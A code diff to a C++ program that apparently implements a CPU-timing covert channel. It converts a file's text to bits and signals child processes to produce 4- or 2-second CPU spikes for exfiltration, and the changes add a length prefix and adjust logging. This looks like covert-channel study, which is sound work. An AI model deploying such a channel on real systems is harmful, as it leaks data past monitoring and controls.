@@ -52,8 +52,11 @@ int main(){
     }
     infile.close();//close the file
   }
+  int message_size = myString.size();//we will transmit the lenght of the message first
+  string message_size2 = bitset<8>(message_size).to_string();
   ofstream outfile;
   outfile.open("out.bin");//open the file we will use for exfiltration later
+  outfile << message_size2;
   for (std::size_t i = 0; i < myString.size(); ++i){ //convert text to binary ready for exfiltration
 
     //implement error correction here
@@ -112,11 +115,11 @@ void sigusr_handler(int signum)
     time_t t = std::time(0);
     tm* now = localtime(&t);
     if (signum == SIGUSR1) {    //signalled to pause
-        cout<< "I am process with PID: " << getpid() << " killed at " << asctime(now);
+        //cout<< "I am process with PID: " << getpid() << " killed at " << asctime(now);
         pause();
     }
     else if(signum == SIGUSR2) {    //signalled to resume
-        cout<< "I am process with PID: " << getpid() << " resumed at " << asctime(now);
+        //cout<< "I am process with PID: " << getpid() << " resumed at " << asctime(now);
     }
 }
 
@@ -155,9 +158,10 @@ void start_spikes(vector<int> bits)
     for(i = 0; i < num_bits; i++) {
         int b = bits[i];
         if(b == 1) {    //pause for every 1 bit
+          cout << "spike CPU for 4 seconds" << endl;
             for(pid_t pid : child_pids) {
                 kill(pid, SIGUSR1);
-                cout << "spike CPU for 4 seconds" << endl;
+                //cout << "spike CPU for 4 seconds" << endl;
 
             }
             usleep(4 * 1e6);
@@ -166,9 +170,10 @@ void start_spikes(vector<int> bits)
             }
         }
         else if(b == 0) { //pause for every 0 bit
+          cout << "spike CPU for 2 seconds" << endl;
             for(pid_t pid : child_pids) {
                 kill(pid, SIGUSR1);
-                cout << "spike CPU for 2 seconds" << endl;
+                //cout << "spike CPU for 2 seconds" << endl;
             }
             usleep(2 * 1e6);
             for(pid_t pid : child_pids) {
